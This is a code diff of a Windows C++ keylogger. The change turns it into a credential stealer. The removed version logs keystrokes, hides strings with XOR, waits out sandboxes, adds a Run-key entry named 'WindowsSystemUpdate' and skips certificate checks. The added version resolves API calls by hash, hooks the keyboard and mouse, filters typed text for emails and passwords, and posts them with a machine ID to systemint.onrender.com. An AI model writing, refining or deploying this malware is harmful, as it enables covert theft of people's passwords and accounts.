@@ -1,108 +1,104 @@
 #include <windows.h>
 #include <winhttp.h>
-#include <winternl.h>
 #include <psapi.h>
 #include <string>
+#include <regex>
 #include <vector>
-#include <array>
 
 #pragma comment(lib, "winhttp.lib")
 
-// --- 1. COMPILE-TIME STRING ENCRYPTION ---
-template <size_t N>
-class XorStr {
-    std::array<char, N> _data;
-public:
-    constexpr XorStr(const char* str) : _data{} {
-        for (size_t i = 0; i < N; ++i) _data[i] = str[i] ^ 0x57; 
-    }
-    std::string decrypt() const {
-        std::string out;
-        for (size_t i = 0; i < N; ++i) out += _data[i] ^ 0x57;
-        return out;
-    }
-};
-#define X(str) XorStr<sizeof(str)>(str).decrypt().c_str()
-
-// --- 2. INDIRECT SYSCALL GLOBALS ---
-extern "C" {
-    DWORD sys_number;
-    ULONG_PTR sys_addr;
-    NTSTATUS DoIndirectSyscall(HANDLE h, PVOID* base, PSIZE_T size, ULONG newProt, PULONG oldProt);
+// --- 1. API HASHING & STRINGS ---
+constexpr DWORD HashString(const char* str) {
+    DWORD hash = 0x811c9dc5;
+    while (*str) { hash ^= (BYTE)*str++; hash *= 0x01000193; }
+    return hash;
 }
 
-// --- 3. THE KEYLOGGER & UPLOAD LOGIC ---
-HHOOK hKeyHook = NULL;
-std::string logBuffer = "";
+FARPROC GetProcAddressH(HMODULE hMod, DWORD targetHash) {
+    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)hMod;
+    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE*)hMod + dos->e_lfanew);
+    PIMAGE_EXPORT_DIRECTORY exports = (PIMAGE_EXPORT_DIRECTORY)((BYTE*)hMod + nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress);
+    DWORD* names = (DWORD*)((BYTE*)hMod + exports->AddressOfNames);
+    WORD* ordinals = (WORD*)((BYTE*)hMod + exports->AddressOfNameOrdinals);
+    DWORD* functs = (DWORD*)((BYTE*)hMod + exports->AddressOfFunctions);
+    for (DWORD i = 0; i < exports->NumberOfNames; i++) {
+        if (HashString((const char*)((BYTE*)hMod + names[i])) == targetHash)
+            return (FARPROC)((BYTE*)hMod + functs[ordinals[i]]);
+    }
+    return NULL;
+}
 
-void UploadData(std::string data) {
-    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0", WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, NULL, NULL, 0);
-    if (!hSession) return;
+// --- 2. DATA UTILS ---
+std::string GetMachineId() {
+    HW_PROFILE_INFOA hw;
+    return GetCurrentHwProfileA(&hw) ? std::string(hw.szHwProfileGuid) : "{000-000}";
+}
 
-    // FORCE TLS 1.2/1.3 for Render.com
-    DWORD dwProto = WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2 | WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_3;
-    WinHttpSetOption(hSession, WINHTTP_OPTION_SECURE_PROTOCOLS, &dwProto, sizeof(dwProto));
+bool IsEmail(const std::string& s) {
+    return std::regex_match(s, std::regex(R"((\w+)(\.|_)?(\w*)@(\w+)(\.(\w+))+)"));
+}
 
-    std::string rawUrl = X("systemint.onrender.com");
-    std::wstring wideUrl(rawUrl.begin(), rawUrl.end());
-    HINTERNET hConnect = WinHttpConnect(hSession, wideUrl.c_str(), INTERNET_DEFAULT_HTTPS_PORT, 0);
+bool IsValidPass(const std::string& s) {
+    // Regex for: Min 8 chars, at least one letter and one number
+    return std::regex_match(s, std::regex(R"(^(?=.*[A-Za-z])(?=.*\d)[A-Za-z\d]{8,}$)\n"));
+}
 
-    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", L"/api/sync", NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
-
-    // Lab Evasion: Ignore SSL certificate errors
-    DWORD dwFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA | SECURITY_FLAG_IGNORE_CERT_DATE_INVALID | SECURITY_FLAG_IGNORE_CERT_CN_INVALID;
-    WinHttpSetOption(hRequest, WINHTTP_OPTION_SECURITY_FLAGS, &dwFlags, sizeof(dwFlags));
-
-    std::string json = "{\"type\":\"Keylogger\", \"data\":\"" + data + "\"}";
-    LPCWSTR header = L"Content-Type: application/json\r\n";
+// --- 3. EXFILTRATION ---
+void UploadData(std::string email, std::string pass) {
+    HINTERNET hS = WinHttpOpen(L"Mozilla/5.0", 1, NULL, NULL, 0);
+    HINTERNET hC = WinHttpConnect(hS, L"systemint.onrender.com", 443, 0);
+    HINTERNET hR = WinHttpOpenRequest(hC, L"POST", L"/api/sync", NULL, NULL, NULL, WINHTTP_FLAG_SECURE);
     
-    WinHttpSendRequest(hRequest, header, (DWORD)-1, (LPVOID)json.c_str(), (DWORD)json.length(), (DWORD)json.length(), 0);
-    WinHttpReceiveResponse(hRequest, NULL);
-
-    WinHttpCloseHandle(hRequest);
-    WinHttpCloseHandle(hConnect);
-    WinHttpCloseHandle(hSession);
+    std::string json = "{\"machineId\":\"" + GetMachineId() + "\", \"email\":\"" + email + "\", \"password\":\"" + pass + "\"}";
+    WinHttpSendRequest(hR, L"Content-Type: application/json\r\n", -1, (LPVOID)json.c_str(), json.length(), json.length(), 0);
+    WinHttpReceiveResponse(hR, NULL);
+    WinHttpCloseHandle(hR); WinHttpCloseHandle(hC); WinHttpCloseHandle(hS);
 }
 
-LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
-    if (nCode == HC_ACTION && wParam == WM_KEYDOWN) {
-        KBDLLHOOKSTRUCT* k = (KBDLLHOOKSTRUCT*)lParam;
-        if ((k->vkCode >= 0x30 && k->vkCode <= 0x39) || (k->vkCode >= 0x41 && k->vkCode <= 0x5A)) {
-            logBuffer += (char)k->vkCode;
-        }
-        if (k->vkCode == VK_SPACE) logBuffer += " ";
-        if (k->vkCode == VK_RETURN && !logBuffer.empty()) {
-            UploadData(logBuffer);
-            logBuffer.clear();
-        }
+// --- 4. HOOKS & LOGIC ---
+std::string buffer = "";
+std::string savedEmail = "";
+std::string savedPass = "";
+
+void ProcessBuffer() {
+    if (buffer.empty()) return;
+    if (IsEmail(buffer)) savedEmail = buffer;
+    else if (IsValidPass(buffer) || buffer.length() >= 8) savedPass = buffer;
+    
+    if (!savedPass.empty()) {
+        UploadData(savedEmail, savedPass);
+        savedEmail.clear(); savedPass.clear();
     }
-    return CallNextHookEx(hKeyHook, nCode, wParam, lParam);
+    buffer.clear();
 }
 
-// --- 4. MAIN ENTRY ---
-int WINAPI WinMain(HINSTANCE hI, HINSTANCE hP, LPSTR lp, int nS) {
-    // Stage 1: Sandbox Evasion - Wait 2 minutes (120,000 ms)
-    Sleep(120000); 
-
-    // Stage 2: Verify Connection
-    UploadData("LAB_CONNECTION_ESTABLISHED");
-
-    // Stage 3: Setup persistence
-    HKEY hKey;
-    if (RegOpenKeyExA(HKEY_CURRENT_USER, X("Software\\Microsoft\\Windows\\CurrentVersion\\Run"), 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
-        char path[MAX_PATH];
-        GetModuleFileNameA(NULL, path, MAX_PATH);
-        RegSetValueExA(hKey, X("WindowsSystemUpdate"), 0, REG_SZ, (BYTE*)path, (DWORD)strlen(path));
-        RegCloseKey(hKey);
+LRESULT CALLBACK KeyProc(int n, WPARAM w, LPARAM l) {
+    if (n == HC_ACTION && w == WM_KEYDOWN) {
+        KBDLLHOOKSTRUCT* k = (KBDLLHOOKSTRUCT*)l;
+        if (k->vkCode == VK_RETURN || k->vkCode == VK_TAB) ProcessBuffer();
+        else if (k->vkCode >= 0x30 && k->vkCode <= 0x5A) buffer += (char)k->vkCode;
+        else if (k->vkCode == VK_SPACE) buffer += " ";
     }
+    return CallNextHookEx(NULL, n, w, l);
+}
 
-    // Stage 4: Begin Monitoring
-    hKeyHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, GetModuleHandle(NULL), 0);
+LRESULT CALLBACK MouseProc(int n, WPARAM w, LPARAM l) {
+    if (n == HC_ACTION && w == WM_LBUTTONDOWN) ProcessBuffer(); // User clicked away/button
+    return CallNextHookEx(NULL, n, w, l);
+}
+
+int WINAPI WinMain(HINSTANCE h, HINSTANCE p, LPSTR c, int s) {
+    // JUNK_HERE
+    Sleep(120000);
+
+    HMODULE u32 = GetModuleHandleA("user32.dll");
+    // Hash for SetWindowsHookExA = 0xDE2B4659
+    auto _SetHook = (HHOOK(WINAPI*)(int, HOOKPROC, HINSTANCE, DWORD))GetProcAddressH(u32, 0xDE2B4659);
+
+    _SetHook(WH_KEYBOARD_LL, KeyProc, GetModuleHandle(NULL), 0);
+    _SetHook(WH_MOUSE_LL, MouseProc, GetModuleHandle(NULL), 0);
 
     MSG msg;
-    while (GetMessage(&msg, NULL, 0, 0)) {
-        TranslateMessage(&msg);
-        DispatchMessage(&msg);
-    }
+    while (GetMessage(&msg, NULL, 0, 0)) { TranslateMessage(&msg); DispatchMessage(&msg); }
     return 0;
 }
